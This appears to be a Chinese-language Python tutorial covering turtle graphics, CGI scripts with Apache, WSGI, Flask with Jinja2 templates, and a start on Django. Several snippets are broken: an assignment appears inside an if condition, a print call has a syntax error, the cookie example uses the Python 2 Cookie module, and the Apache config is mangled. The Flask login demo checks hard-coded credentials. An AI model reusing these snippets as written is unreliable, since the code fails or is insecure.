1966年Seymour Papert和Wally Feurzig发明了一种专门给儿童学习编程的语言LOGO语言, 它的特色就是通过编程指挥一个小海龟(turtle)在屏幕上绘图。

海龟绘图(Turtle Graphics)后来被移植到各种高级语言中, Python内置了turtle库, 基本上100%复制了原始的Turtle Graphics的所有功能

</pre>指挥小海龟绘制一个长方形<textarea>
# 导入turtle包的所有内容:
from turtle import *

width(4)        # 设置笔刷宽度

forward(200)    # 前进
right(90)       # 右转90度

pencolor('red') # 笔刷颜色
forward(100)
right(90)

pencolor('green')
forward(200)
right(90)

pencolor('blue')
forward(100)
right(90)

# 调用done()函数让窗口进入消息循环等待被关闭,否则由于Python进程会立刻结束,将导致窗口被立刻关闭
done()

</textarea><textarea>
import turtle as t
t.color('blue')
# forward即fd向前i长度,然后70度左转
for i in range(270):
    t.fd(i)
    t.left(70)
t.done()

</textarea>turtle包只是一个绘图库,但配合Python代码可绘制各种复杂图形,如通过循环绘制5个五角星<textarea>
from turtle import *

def drawStar(x, y):
    pu()
    goto(x, y)
    pd()
    # set heading: 0
    seth(0)
    for i in range(5):
        fd(40)
        rt(144)

for x in range(0, 250, 50):
    drawStar(x, 0)

done()

</textarea>使用递归可以绘制出非常复杂的图形,例如下面的代码可以绘制一棵分型树<textarea>
from turtle import *

colormode(255)  # 设置色彩模式是RGB
lt(90)
lv = 14
l = 120
s = 45
width(lv)
# 初始化RGB颜色:
r = 0
g = 0
b = 0
pencolor(r, g, b)

penup()
bk(l)
pendown()
fd(l)

def draw_tree(l, level):
    global r, g, b
    w = width()           # save the current pen width
    width(w * 3.0 / 4.0)  # narrow the pen width
    # set color:
    r = r + 1
    g = g + 2
    b = b + 3
    pencolor(r % 200, g % 200, b % 200)

    l = 3.0 / 4.0 * l
    lt(s)
    fd(l)

    if level < lv: draw_tree(l, level + 1)
    bk(l)
    rt(2 * s)
    fd(l)

    if level < lv: draw_tree(l, level + 1)
    bk(l)
    lt(s)

    width(w)  # restore the previous pen width

speed("fastest")
draw_tree(l, 4)
done()

</textarea>
</div>

<div id="cgi">
<h3>CGI</h3><pre>
CGI(Common Gateway Interface),通用网关接口,它是一段程序,运行在服务器上如HTTP服务器,提供同客户端HTML页面的接口,CGI目前由NCSA维护

CGI是一个web服务器主机提供信息服务的标准接口,只要遵循这个接口,web服务器就能获取客户端提交的信息,转交给服务端的CGI程序进行处理,然后将处理结果返回给客户端。CGI通讯是由两部分组成的：一部分是用户的浏览器显示的页面即html页面,另一部分则是运行在服务器上的CGI程序

CGI其实就是连通HTTP服务器和其他资源如数据库、文件系统的一个通道,也是一个接口规范,所以学名就叫做通用网关接口

网页浏览
为了更好的了解CGI是如何工作的,可以从在网页上点击一个链接或URL的流程:
1、使用浏览器访问URL并连接到HTTP web服务器。
2、Web服务器接收到请求信息后解析URL,并查找访问的文件在服务器上是否存在,如果存在返回文件的内容,否则返回错误信息
3、浏览器从服务器上接收信息,并显示接收的文件或错误信息。

CGI程序可以是Python脚本、PERL脚本、SHELL脚本、C或C++程序等

【 Web服务器支持及配置 】
进行CGI编程前确保Web服务器支持CGI及已经配置了CGI的处理程序。

Apache支持CGI配置:
设置CGI目录
ScriptAlias /cgi-bin/ /var/www/cgi-bin/

所有HTTP服务器执行CGI程序都保存在一个预先配置的CGI目录,并按照惯例它被命名为/var/www/cgi-bin目录,可修改httpd.conf配置文件
CGI文件的扩展名为.cgi,python也可以使用.py扩展名。

</pre><textarea>
< Directory "/var/www/cgi-bin">
   AllowOverride None
   Options +ExecCGI
   Order allow,deny
   Allowfromall
< /Directory>

</textarea><pre>
在AddHandler中添加.py后缀,这样就可以访问.py结尾的python脚本文件:
AddHandler cgi-script .cgi .pl .py

【 第一个CGI程序 】
Python3.x自带开发环境下的cgi服务器,默认执行当前目录下的cgi-bin目录中的文件,python3 -m http.server --cgi 8000目录开启服务器
必须加上#!/usr/bin/env python3

</pre>使用Python创建第一个CGI程序,文件名为hello.py,文件位于/var/www/cgi-bin目录中<textarea>
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

print("Content-type:text/html\n")
print('hello world')

</textarea><textarea>
#!/usr/bin/python
# -*- coding: UTF-8 -*-

print("Content-type:text/html")      # 告知浏览器显示的内容类型为"text/html"
print()                              # 输出一个空行用于告诉服务器结束头部信息
print('< html>')
print('< head>')
print('< meta charset="utf-8">')
print('< title>Hello World - 我的第一个 CGI 程序！< /title>')
print('< /head>')
print('< body>')
print('< h2>Hello World! 我的第一CGI程序< /h2>')
print('< /body>')
print('< /html>')

</textarea><pre>
文件保存后修改hello.py文件权限为755:
chmod 755 hello.py

以上程序在浏览器访问http://localhost/cgi-bin/hello.py显示结果如下:
Hello World! 我的第一CGI程序

【 HTTP头部 】
HTTP字段名: 字段内容

CGI程序中常见HTTP头部:
Content-type: 请求的与实体对应的MIME信息,例如Content-type:text/html
Expires: Date 响应过期的日期和时间
Location: URL 用来重定向接收方到非请求URL的位置来完成请求或标识新的资源
Last-modified: Date 请求资源的最后修改时间
Content-length: N 请求的内容长度
Set-Cookie: String  设置Http Cookie

【 CGI环境变量 】
所有的CGI程序都接收以下的环境变量,这些变量在CGI程序中发挥了重要的作用:

CONTENT_TYPE
该环境变量的值指示所传递来的信息的MIME类型,目前环境变量CONTENT_TYPE一般都是application/x-www-form-urlencoded表示数据来自于HTML表单

CONTENT_LENGTH
如果服务器与CGI程序信息的传递方式是POST,这个环境变量即从标准输入STDIN中可读到的有效数据的字节数。这个环境变量在读取所输入的数据时必须使用。

HTTP_COOKIE
客户机内的COOKIE内容。

HTTP_USER_AGENT
提供包含了版本数或其他专有数据的客户浏览器信息。

PATH_INFO
这个环境变量的值表示紧接在CGI程序名之后的其他路径信息,常常作为CGI程序的参数出现。

QUERY_STRING
如果服务器与CGI程序信息的传递方式是GET,这个环境变量的值即所传递的信息,这个信息经跟在CGI程序名的后面,两者中间用一个问号'?'分隔。

REMOTE_ADDR
这个环境变量的值是发送请求的客户机的IP地址,例如上面的192.168.1.67。这个值总是存在的,而且它是Web客户机需要提供给Web服务器的唯一标识,可以在CGI程序中用它来区分不同的Web客户机。

REMOTE_HOST
这个环境变量的值包含发送CGI请求的客户机的主机名。如果不支持想查询则无需定义此环境变量。

REQUEST_METHOD
提供脚本被调用的方法。对于使用HTTP/1.0协议的脚本,仅GET和POST有意义。

SCRIPT_FILENAME
CGI脚本的完整路径

SCRIPT_NAME
CGI脚本的的名称

SERVER_NAME
这是WEB服务器的主机名、别名或IP地址。

SERVER_SOFTWARE 这个环境变量的值包含了调用CGI程序的HTTP服务器的名称和版本号,例如上面的值为Apache/2.2.14(Unix)

</pre>CGI脚本输出CGI的环境变量,保存为test.py,并修改文件权限为755,执行<textarea>
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

import os

print("Content-type: text/html")
print()
print("< meta charset=\"utf-8\">")
print("< b>环境变量< /b>< br>")
print("< ul>")
for key in os.environ.keys():
    print("< li>< span style='color:green'>%30s < /span> : %s < /li>" % (key,os.environ[key]))
print("< /ul>")

</textarea><pre>
【 GET和POST方法 】
浏览器客户端通过两种方法向服务器传递信息,这两种方法就是GET方法和POST方法。

使用GET方法传输数据
GET方法发送编码后的用户信息到服务端,数据信息包含在请求页面的URL上,以"?"号分割
http://www.test.com/cgi-bin/hello.py?key1=value1&key2=value2

GET请求可被缓存
GET请求保留在浏览器历史记录中
GET请求可被收藏为书签
GET请求不应在处理敏感数据时使用
GET请求有长度限制
GET请求只应当用于取回数据

</pre>GET方法:使用GET方法向hello_get.py程序发送两个参数,/cgi-bin/test.py?name=教程&url=http://www.xxx.com<textarea>
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
# 权限为755:chmod 755 hello_get.py

import cgi, cgitb                 # CGI处理模块
form = cgi.FieldStorage()         # 创建FieldStorage的实例化
site_name = form.getvalue('name') # 获取数据
site_url  = form.getvalue('url')

print("Content-type:text/html")
print()
print("< html>")
print("< head>")
print("< meta charset=\"utf-8\">")
print("< title>CGI测试实例< /title>")
print("< /head>")
print("< body>")
print("< h2>%s官网:%s< /h2>" % (site_name, site_url))
print("< /body>")
print("< /html>")

# 通过HTML的表单使用GET方法向服务器发送两个数据,提交的服务器脚本是hello_get.py文件
# 默认cgi-bin目录只能存放脚本文件,将hello_get.html存储在test目录下,修改文件权限chmod 755 hello_get.html
< meta charset="utf-8">
< form action="/cgi-bin/hello_get.py" method="get">
  站点名称: < input type="text" name="name">  < br />
  站点 URL: < input type="text" name="url" />
  < input type="submit" value="提交" />
< /form>

</textarea><pre>
【 使用POST方法传递数据 】
使用POST方法向服务器传递数据是更安全可靠的,像一些敏感信息如用户密码等需要使用POST传输数据。

</pre>hello_get.py处理浏览器提交的POST表单数据<textarea>
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

import cgi, cgitb                 # CGI处理模块
form = cgi.FieldStorage()         # 创建FieldStorage的实例化
site_name = form.getvalue('name') # 获取数据
site_url  = form.getvalue('url')

print("Content-type:text/html\n")
print("< meta charset=\"utf-8\">")
print("< h2>%s官网:%s< /h2>" % (site_name, site_url))

# 表单通过POST方法(method="post")向服务器脚本 hello_get.py提交数据
< meta charset="utf-8">
< form action="/cgi-bin/hello_get.py" method="post">
  站点名称: < input type="text" name="name">  < br />
  站点 URL: < input type="text" name="url" />
  < input type="submit" value="提交" />
< /form>

</textarea>通过CGI程序传递checkbox数据<textarea>
< meta charset="utf-8">
< form action="/cgi-bin/checkbox.py" method="POST" target="_blank">
  < input type="checkbox" name="runoob" value="on" /> baidu
  < input type="checkbox" name="google" value="on" /> Google
  < input type="submit" value="选择站点" />
< /form>

# checkbox.py文件的代码:
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
# 修改checkbox.py权限chmod 755 checkbox.py

import cgi, cgitb                 # CGI处理模块
form = cgi.FieldStorage()         # 创建FieldStorage的实例化
google_flag = "是" if form.getvalue('google') else "否"  # 接收字段数据
runoob_flag = "是" if form.getvalue('runoob') else "否"

print("Content-type:text/html\n")
print("< meta charset=\"utf-8\">")
print("< h2> 菜鸟教程是否选择了 : %s< /h2>" % runoob_flag)
print("< h2> Google是否选择了 : %s< /h2>" % google_flag)

</textarea>通过CGI程序向服务器传递Radio数据<textarea>
< form action="/cgi-bin/radiobutton.py" method="post" target="_blank">
  < input type="radio" name="site" value="runoob" /> 菜鸟教程
  < input type="radio" name="site" value="google" /> Google
  < input type="submit" value="提交" />
< /form>

### radiobutton.py 脚本代码如下:
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
# 修改radiobutton.py权限chmod 755 radiobutton.py

import cgi, cgitb                 # CGI处理模块
form = cgi.FieldStorage()         # 创建FieldStorage的实例化
site = form.getvalue('site') if form.getvalue('site') else "提交数据为空" # 接收字段数据

print("Content-type:text/html\n")
print("< meta charset=\"utf-8\">")
print("< h2> 选中的网站是 %s< /h2>" % site)

</textarea>通过CGI程序向服务器传递Textarea数据<textarea>
< form action="/cgi-bin/textarea.py" method="post" target="_blank">
< textarea name="textcontent" cols="40" rows="4">在这里输入内容...< /textarea>
< input type="submit" value="提交" />
< /form>

### textarea.py脚本代码如下:
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
# 修改textarea.py权限chmod 755 textarea.py

import cgi, cgitb                 # CGI处理模块
form = cgi.FieldStorage()         # 创建FieldStorage的实例化
text_content = form.getvalue('textcontent') if form.getvalue('textcontent') else "没有内容" # 接收字段数据

print("Content-type:text/html\n")
print("< meta charset=\"utf-8\">")
print("< h2> 输入的内容是:%s< /h2>" % text_content)

</textarea>通过CGI程序传递下拉数据<textarea>
< form action="/cgi-bin/dropdown.py" method="post" target="_blank">
< select name="dropdown">
< option value="runoob" selected>菜鸟教程< /option>
< option value="google">Google< /option>
< /select>
< input type="submit" value="提交"/>
< /form>

### dropdown.py脚本代码如下所示:
#!/usr/bin/python
# -*- coding: UTF-8 -*-
# 修改 dropdown.py 权限:chmod 755 dropdown.py

import cgi, cgitb                 # CGI处理模块
form = cgi.FieldStorage()         # 创建FieldStorage的实例化
dropdown_value = form.getvalue('dropdown') if form.getvalue('dropdown') else "没有内容" # 接收字段数据

print("Content-type:text/html\n")
print("< meta charset=\"utf-8\">")
print("< h2> 选中的选项是:%s< /h2>" % dropdown_value)

</textarea><pre>
【 CGI中使用Cookie 】
http协议无状态,不对用户身份的进行判断,这样给编程人员带来很大的不便,而cookie功能的出现弥补了这个不足。

cookie的语法
http cookie的发送是通过http头部来实现的,早于文件的传递,头部set-cookie的语法如下:
Set-cookie:name=name;expires=date;path=path;domain=domain;secure
name=name: 需要设置cookie的值(name不能使用";"和","号),有多个name值时用";"分隔,例如:name1=name1;name2=name2;name3=name3
expires=date: cookie的有效期限,格式expires="Wdy,DD-Mon-YYYY HH:MM:SS"
path=path: 设置cookie支持的路径,如果path是一个路径则cookie对这个目录下的所有文件及子目录生效,如path="/cgi-bin/",如果path是一个文件则cookie指对这个文件生效,如path="/cgi-bin/cookie.cgi"。
domain=domain: 对cookie生效的域名,如domain="www.runoob.com"
secure: 此标志表示cookie只能通过SSL协议的https服务器来传递。
cookie的接收是通过设置环境变量HTTP_COOKIE来实现的,CGI程序可以通过检索该变量获取cookie信息。

</pre>Cookie设置<textarea>
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
# 修改cookie_set.py权限:chmod 755 cookie_set.py

print('Content-Type: text/html')
print('Set-Cookie: name="教程";expires=Wed, 28 Aug 2016 18:30:00 GMT')
print()
print("""Cookie set OK!""")

</textarea>检索Cookie信息,Cookie信息存储在CGI的环境变量HTTP_COOKIE中,存储格式:key1=value1;key2=value2;key3=value3....<textarea>
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
# 修改cookie_get.py权限:chmod 755 cookie_get.py

# 导入模块
import os
import Cookie

print("Content-type: text/html\n")
print("""读取cookie信息<br>""")

if 'HTTP_COOKIE' in os.environ:
    cookie_string=os.environ.get('HTTP_COOKIE')
    c=Cookie.SimpleCookie()
    c.load(cookie_string)

    try:
        data=c['name'].value
        print("cookie data: "+data+"<br>")
    except KeyError:
        print("cookie 没有设置或者已过去<br>")

</textarea>【 cgi文件上传实例 】<textarea>
<form enctype="multipart/form-data" action="/cgi-bin/save_file.py" method="post">
  <input type="file" name="filename" />
  <input type="submit" value="上传" />
</form>

### save_file.py脚本文件代码如下:
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
# 修改 save_file.py 权限chmod 755 save_file.py

import os, cgi
import cgitb; cgitb.enable()

form = cgi.FieldStorage()
fileitem = form['filename']  # 获取文件名

if fileitem.filename:        # 检测文件是否上传
   fn = os.path.basename(fileitem.filename)                      # 设置文件路径
   fn = os.path.basename(fileitem.filename.replace("\\", "/" ))  # Unix/Linux必须替换文件分隔符
   open('/tmp/' + fn, 'wb').write(fileitem.file.read())
   message = '文件 "' + fn + '" 上传成功'
else:
   message = '文件没有上传'

print("Content-type: text/html\n")
print ("%s" % (message,))

</textarea>cgi文件下载对话框<textarea>
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

print("Content-Disposition: attachment; filename=\"foo.txt\"\n";)
fo = open("foo.txt", "rb")  # 打开文件
str = fo.read();
print(str)
fo.close()                  # 关闭文件

</textarea>
</div>

<div id="web">
<h3>Python Web开发</h3><pre>
Web开发指的是开发基于B/S架构,通过前后端的配合,将后台服务器的数据在浏览器上展现给前台用户的应用

Web应用开发可以说是目前软件开发中最重要的部分。Web开发也经历了好几个阶段:
1、静态Web页面:由文本编辑器直接编辑并生成静态的HTML页面,如果要修改Web页面的内容,就需要再次编辑HTML源文件,早期的互联网Web页面就是静态的;
2、CGI:由于静态Web页面无法与用户交互,比如用户填写了一个注册表单,静态Web页面就无法处理。要处理用户发送的动态数据,出现了Common Gateway Interface,简称CGI,用C/C++编写。
3、ASP/JSP/PHP:由于Web应用特点是修改频繁,用C/C++这样的低级语言非常不适合Web开发,而脚本语言由于开发效率高,与HTML结合紧密,因此,迅速取代了CGI模式。ASP是微软推出的用VBScript脚本编程的Web开发技术,而JSP用Java来编写脚本,PHP本身则是开源的脚本语言。
4、MVC:为了解决直接用脚本语言嵌入HTML导致的可维护性差的问题,Web应用也引入了Model-View-Controller的模式,来简化Web开发。ASP发展为ASP.Net,JSP和PHP也有一大堆MVC框架

Web开发技术仍在快速发展中,异步开发、新的MVVM前端技术层出不穷。
Python的诞生历史比Web还要早,由于Python是一种解释型的脚本语言,开发效率高,所以非常适合用来做Web开发。
Python有上百种Web开发框架,有很多成熟的模板技术,选择Python开发Web应用,不但开发效率高,而且运行速度快。

</pre><pre>
【 HTTP格式 】
HTTP协议是一种文本协议,其格式也非常简单。
每个HTTP请求和响应都遵循相同的格式,一个HTTP包含Header和Body两部分,其中Body可选

HTTP GET请求的格式:每个Header一行一个,换行符是\r\n
GET /path HTTP/1.1
Header1: Value1
Header2: Value2
Header3: Value3

HTTP POST请求的格式:当遇到连续两个\r\n时,Header部分结束,后面的数据全部是Body
POST /path HTTP/1.1
Header1: Value1
Header2: Value2
Header3: Value3

body data goes here...

HTTP响应的格式:HTTP响应如果包含body,也是通过\r\n\r\n来分隔的
200 OK
Header1: Value1
Header2: Value2
Header3: Value3

body data goes here...

Body的数据类型由Content-Type头来确定,如果是网页Body就是文本,如果是图片Body就是图片的二进制数据。
当存在Content-Encoding时Body数据是被压缩的,最常见的压缩方式是gzip,所以看到Content-Encoding: gzip时需要将Body数据先解压缩才能得到真正的数据

</pre>

<h4>WSGI接口</h4><pre>
一个Web应用的本质就是:
1、浏览器发送一个HTTP请求
2、服务器收到请求,生成一个HTML文档
3、服务器把HTML文档作为HTTP响应的Body发送给浏览器
4、浏览器收到HTTP响应,从HTTP Body取出HTML文档并显示

最简单的Web应用就是先把HTML用文件保存好,用一个现成的HTTP服务器软件接收用户请求,从文件中读取HTML再返回。Apache、Nginx、Lighttpd等这些常见的静态服务器就是干这件事情的
要动态生成HTML就需要把上述步骤自己来实现,接受HTTP请求、解析HTTP请求、发送HTTP响应都是苦力活,如果自己来写这些底层代码,还没开始写动态HTML就得花大量时间去读HTTP规范。
正确的做法是底层代码由专门的服务器软件实现,用Python专注于生成HTML文档。因为不希望接触到TCP连接、HTTP原始请求和响应格式,所以需要一个统一的接口,专心用Python编写Web业务,这个接口就是WSGI:Web Server Gateway Interface。
WSGI接口定义非常简单,它只要求Web开发者实现一个函数就可以响应HTTP请求

</pre><textarea>
def application(environ, start_response):
    start_response('200 OK', [('Content-Type', 'text/html')])
    return [b'<h1>Hello, web!</h1>']

</textarea><pre>
application()函数就是符合WSGI标准的一个HTTP处理函数,它接收两个参数:
environ:一个包含所有HTTP请求信息的dict对象
start_response:一个发送HTTP响应的函数

在application()中调用start_response('200 OK', [('Content-Type', 'text/html')])就发送了HTTP响应的Header,Header只能发送一次,也就是只能调用一次start_response()。start_response()函数接收两个参数,一个是HTTP响应码,一个是list表示的HTTP Header,每个Header用一个包含两个str的tuple表示。
函数的返回值b'< h1>Hello, web!< /h1>'将作为HTTP响应的Body发送给浏览器

无论多么复杂的Web应用程序,入口都是一个WSGI处理函数。HTTP请求的所有输入信息都可以通过environ获得,HTTP响应的输出都可以通过start_response()加上函数返回值作为Body。
复杂的Web应用程序,光靠一个WSGI函数来处理还是太底层了,需要在WSGI之上再抽象出Web框架,进一步简化Web开发

有了WSGI,要关心的就是如何从environ这个dict对象拿到HTTP请求信息,然后构造HTML,通过start_response()发送Header,最后返回Body。
整个application()函数本身没有涉及到任何解析HTTP的部分,也就是说底层代码不需要自己编写,只负责在更高层次上考虑如何响应请求就可以了。

application()函数必须由WSGI服务器来调用,有很多符合WSGI规范的服务器,Python内置了一个WSGI服务器,这个模块叫wsgiref,它是用纯Python编写的WSGI服务器的参考实现。所谓"参考实现"是指该实现完全符合WSGI标准,但是不考虑任何运行效率,仅供开发和测试使用。

</pre>运行WSGI服务<textarea>
# 先编写hello.py,实现Web应用程序的WSGI处理函数:
def application(environ, start_response):
    print(environ)
    start_response('200 OK', [('Content-Type', 'text/html')])
    body = '<h1>Hello, %s!</h1>' % (environ['PATH_INFO'][1:] or 'web')  # 从environ里读取PATH_INFO,这样可以显示更加动态的内容
    return [body.encode('utf-8')]

# 然后再编写一个server.py,负责启动WSGI服务器,加载application()函数:
from wsgiref.simple_server import make_server   # 从wsgiref模块导入
from hello import application                   # 导入编写的application函数

httpd = make_server('', 8000, application)      # 创建一个服务器,IP地址为空,端口是8000,处理函数是application
print('Serving HTTP on port 8000...')
httpd.serve_forever()                           # 开始监听HTTP请求

命令行输入python3 server.py启动WSGI服务器,然后浏览器打开http://localhost:8000/,在命令行可以看到wsgiref打印的log信息,按Ctrl+C终止服务器

# environ输出
{
'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;...36:*.spx=00;36:*.xspf=00;36:',
'HOSTTYPE': 'x86_64',
'LESSCLOSE': '/usr/bin/lesspipe %s %s',
'LANG': 'C.UTF-8',
'USER': 'berlin75',
'PWD': '/mnt/e/wamp64/www/study/python',
'HOME': '/home/berlin75',
'NAME': 'LAPTOP-0KMQM01D',
'XDG_DATA_DIRS': '/usr/local/share:/usr/share:/var/lib/snapd/desktop',
'SHELL': '/bin/bash',
'TERM': 'xterm-256color',
'SHLVL': '1',
'LOGNAME': 'berlin75',
'PATH': '/home/berlin75/.local/bin:/usr/local/sbin:.../mnt/c/Users/lenovo/AppData/Roaming/npm:/snap/bin',
'LESSOPEN': '| /usr/bin/lesspipe %s',
'_': '/usr/bin/python3',
'SERVER_NAME': 'LAPTOP-0KMQM01D.localdomain',
'GATEWAY_INTERFACE': 'CGI/1.1',
'SERVER_PORT': '8000',
'REMOTE_HOST': '',
'CONTENT_LENGTH': '',
'SCRIPT_NAME': '',
'SERVER_PROTOCOL': 'HTTP/1.1',
'SERVER_SOFTWARE': 'WSGIServer/0.2',
'REQUEST_METHOD': 'GET',
'PATH_INFO': '/',
'QUERY_STRING': '',
'REMOTE_ADDR': '127.0.0.1',
'CONTENT_TYPE': 'text/plain',
'HTTP_HOST': 'localhost:8000',
'HTTP_CONNECTION': 'keep-alive',
'HTTP_CACHE_CONTROL': 'max-age=0',
'HTTP_UPGRADE_INSECURE_REQUESTS': '1',
'HTTP_USER_AGENT': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
'HTTP_ACCEPT': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
'HTTP_ACCEPT_ENCODING': 'gzip, deflate, br',
'HTTP_ACCEPT_LANGUAGE': 'zh-CN,zh;q=0.9',
'HTTP_COOKIE': 'Hm_lvt_9c975e...833868; Hm_lpvt_9c975...2b2f54=1564070433',
'wsgi.input': <_io.BufferedReader name=4>,
'wsgi.errors': <_io.TextIOWrapper name='< stderr>' mode='w' encoding='UTF-8'>,
'wsgi.version': (1, 0),
'wsgi.run_once': False,
'wsgi.url_scheme': 'http',
'wsgi.multithread': True,
'wsgi.multiprocess': False,
'wsgi.file_wrapper': < class 'wsgiref.util.FileWrapper'>
}
127.0.0.1 - - [26/Jul/2019 11:24:34] "GET / HTTP/1.1" 200 20

</textarea>

<h4>python Web Framework</h4><pre>
WSGI框架其实一个Web App就是写一个WSGI的处理函数,针对每个HTTP请求进行响应,如何处理HTTP请求不是问题,问题是如何处理100个不同的URL,每一个URL可以对应GET、POST、PUT、DELETE等请求,通常只考虑最常见的GET和POST请求。

</pre>一个最简单的想法是从environ变量里取出HTTP请求的信息,然后逐个判断,只是这么写下去代码是肯定没法维护了<textarea>
def application(environ, start_response):
    method = environ['REQUEST_METHOD']
    path = environ['PATH_INFO']
    if method=='GET' and path=='/':
        return handle_home(environ, start_response)
    if method=='POST' and path='/signin':
        return handle_signin(environ, start_response)
    ...

</textarea><pre>
WSGI提供的接口虽然比HTTP接口高级了不少,但和Web App的处理逻辑比还是比较低级,需要在WSGI接口之上能进一步抽象,让专注于用一个函数处理一个URL,至于URL到函数的映射就交给Web框架来做。

由于用Python开发一个Web框架十分容易,所以Python有上百个开源的Web框架。

常见的Python Web框架:
Flask:比较流行的Web框架
Django:全能型Web框架
web.py:一个小巧的Web框架
Bottle:和Flask类似的Web框架
Tornado:Facebook的开源异步Web框架

有了Web框架,在编写Web应用时重点就从WSGI处理函数转移到URL+对应的处理函数,这样编写Web App就更加简单了。
在编写URL处理函数时,除了配置URL外从HTTP请求拿到用户数据也是非常重要的,Flask通过request.form['name']来获取表单的内容。

【 Flask编写Web App比WSGI接口简单 】
$ pip install flask

写一个app.py处理3个URL:
GET /:首页,返回Home;
GET /signin:登录页,显示登录表单;
POST /signin:处理登录表单,显示登录结果。
同一个URL/signin分别有GET和POST两种请求,映射到两个处理函数中。

</pre>Flask通过Python的装饰器在内部自动地把URL和函数给关联起来<textarea>
from flask import Flask
from flask import request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def home():
    return '<h1>Home</h1>'

@app.route('/signin', methods=['GET'])
def signin_form():
    return '''<form action="/signin" method="post">
              <p><input name="username"></p>
              <p><input name="password" type="password"></p>
              <p><button type="submit">Sign In</button></p>
              </form>'''

@app.route('/signin', methods=['POST'])
def signin():
    if request.form['username']=='admin' and request.form['password']=='password': # 从request对象读取表单内容
        return 'Hello, admin!'
    return 'Bad username or password'

if __name__ == '__main__':
    app.run()

</textarea><pre>
运行python app.py,Flask自带的Server在端口5000上监听:
$ python app.py
* Running on http://127.0.0.1:5000/
打开浏览器,输入首页地址http://localhost:5000/
再在浏览器地址栏输入http://localhost:5000/signin显示登录表单

</pre>

<h4>使用模板</h4><pre>
Web框架把开发者从WSGI中拯救出来了,现在只需要不断地编写函数,带上URL可以继续Web App的开发了。
但是Web App不仅仅是处理逻辑,展示给用户的页面也非常重要。在函数中返回一个包含HTML的字符串,简单的页面还可以,但复杂页面很难在Python的字符串中正确地写出来,由于在Python代码里拼字符串是不现实的,所以模板技术出现了。
使用模板需要预先准备一个HTML文档,这个HTML文档不是普通的HTML,而是嵌入了一些变量和指令,然后根据传入的数据替换后得到最终的HTML发送给用户

MVC:Model-View-Controller"模型-视图-控制器"
Python处理URL的函数就是C:Controller,Controller负责业务逻辑,比如检查用户名是否存在,取出用户信息等
包含变量{{ name }}的模板就是V:View,View负责显示逻辑,通过简单地替换一些变量,View最终输出的就是用户看到的HTML。
MVC中的Model是用来传给View的,这样View在替换变量的时候就可以从Model中取出相应的数据。

</pre>把直接输出字符串作为HTML的例子用MVC模式改写<textarea>
from flask import Flask, request, render_template
app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def home():
    return render_template('home.html')

@app.route('/signin', methods=['GET'])
def signin_form():
    return render_template('form.html')

@app.route('/signin', methods=['POST'])
def signin():
    username = request.form['username']
    password = request.form['password']
    if username=='admin' and password=='password':
        return render_template('signin-ok.html', username=username)
    return render_template('form.html', message='Bad username or password', username=username)

if __name__ == '__main__':
    app.run()

</textarea><pre>
Flask通过render_template()函数来实现模板的渲染。Python的模板也有很多种,Flask默认支持的模板是jinja2,所以先直接安装jinja2:
$ pip install jinja2
然后开始编写jinja2模板,要把模板放到正确的templates目录下,templates和app.py在同级目录下

</pre><textarea>
# home.html用来显示首页的模板:
< title>Home< /title>
< h1 style="font-style:italic">Home< /h1>

# form.html用来显示登录表单的模板:加了一点条件判断,把form.html重用为登录失败的模板
< title>Please Sign In< /title>
{% if message %}
< p style="color:red">{{ message }}< /p>
{% endif %}
< form action="/signin" method="post">
  < p>< input name="username" placeholder="Username" value="{{ username }}">< /p>
  < p>< input name="password" placeholder="Password" type="password">< /p>
  < p>< button type="submit">Sign In< /button>< /p>
< /form>

# signin-ok.html登录成功的模板:
< title>Welcome, {{ username }}< /title>
< p>Welcome, {{ username }}!< /p>

</textarea><pre>
通过MVC,在Python代码中处理M:Model和C:Controller,而V:View是通过模板处理的,这样就成功地把Python代码和HTML代码最大限度地分离了,HTML代码全部放到模板里,写起来更有效率,模板改起来很方便,而且改完保存后刷新浏览器就能看到最新的效果

在Jinja2模板中用{{ name }}表示一个需要替换的变量。很多时候还需要循环、条件判断等指令语句,在Jinja2中,用{% ... %}表示指令。
比如循环输出页码:
{% for i in page_list %}
    < a href="/page/{{ i }}">{{ i }}< /a>
{% endfor %}
如果page_list是一个list:[1, 2, 3, 4, 5],上面的模板将输出5个超链接。

除了Jinja2,常见的模板还有:
Mako:用<% ... %>和${xxx}的一个模板;
Cheetah:也是用<% ... %>和${xxx}的一个模板;
Django:Django是一站式框架,内置一个用{% ... %}和{{ xxx }}的模板。

</pre>
</div>

<div id="django">
<h3>Django</h3><pre>
Django是开源的python Web应用框架,由Python写成,遵守BSD版权,初次发布于2005年7月,并于2008年9月发布了第一个正式版本1.0 。

Django采用了MVT的框架模式,即模型M、视图V和模版T,Django对传统的MVC设计模式进行了修改,将视图分成View模块和Template模块两部分,将动态的逻辑处理与静态的页面展现分离开。而Model采用了ORM技术,将关系型数据库表抽象成面向对象的Python类,将表操作转换成类操作,避免了复杂的SQL语句编写。MTV和MVC本质上是一样的
模型(Model):和MVC中的定义一样
模板(Template):将数据与HTML语言结合起来的引擎
视图(View):负责实际的业务逻辑实现

Django本质上是Python语言的一个类库,因此可以通过pip工具安装
pip3 install Django

验证Django是否能被Python识别,或者使用pip list命令查看是否存在Django模块,或者python3 -m django --version
>>> import django
>>> print(django.get_version())

</pre><textarea>
>>> print([e for e in dir(django) if not e.startswith('_')])
['VERSION', 'apps', 'conf', 'contrib', 'core', 'db', 'dispatch', 'forms', 'get_version', 'http', 'middleware', 'setup', 'template', 'templatetags', 'urls', 'utils', 'views']

>>> print([e for e in dir(django.urls) if not e.startswith('_')])
